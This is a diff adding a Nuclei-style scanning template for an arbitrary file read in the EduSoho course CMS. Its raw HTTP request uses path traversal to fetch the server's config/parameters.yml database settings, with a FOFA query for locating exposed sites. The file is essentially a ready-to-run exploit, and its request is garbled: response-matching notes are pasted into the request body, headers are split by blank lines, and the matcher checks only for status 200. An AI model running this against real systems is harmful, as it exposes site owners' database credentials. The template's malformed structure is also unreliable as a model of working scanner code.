@@ -1,0 +1,52 @@
+id: poc-xguz56kugq8tp7nc
+info:
+  name: Edusoho网络课堂cms存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xguz56kugq8tp7nc'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xguz56kugq8tp7nc
+    fofa: title="EduSoho"
+http:
+- raw:
+  - 'GET /export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+
+    Connection: Keep-Alive
+
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+
+
+    Cookie: PHPSESSID=6hjpl1c6pvu8i0uln8cr6niv77
+
+
+    Upgrade-Insecure-Requests: 127
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    database_name
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
